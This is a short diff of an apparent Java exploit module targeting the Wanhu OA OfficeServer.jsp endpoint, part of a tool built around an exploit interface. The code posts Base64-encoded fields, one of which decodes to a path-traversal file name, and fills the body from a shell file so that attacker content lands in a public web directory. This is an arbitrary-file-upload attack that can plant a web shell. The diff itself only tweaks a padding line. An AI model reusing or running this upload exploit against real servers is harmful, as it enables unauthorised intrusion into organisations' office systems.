@@ -5,7 +5,6 @@ import Utilss.Response;
 import Utilss.shell;
 import core.Exploitlnterface;
 import javafx.scene.control.TextArea;
-
 import java.util.HashMap;
 
 public class wanhuoa_OfficeServer implements Exploitlnterface {
@@ -30,7 +29,7 @@ public class wanhuoa_OfficeServer implements Exploitlnterface {
                     "isDoc=dHJ1ZQ==\r\n" +
                     "moduleType=Z292ZG9jdW1lbnQ=\r\n" +
                     "FILETYPE=Li4vLi4vcHVibGljL2VkaXQvbmlzaGl6aHUudHh0\r\n" +
-                    "111111111111111111111111111111111111111111111111\r\n" +
+                    "111111111111111111222222222222222222222\r\n" +
                     shell.readFile(shell.Testpath);
 
             Response post1 = HttpTools.post(url + "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp", post, new HashMap<String, String>(), "utf-8");
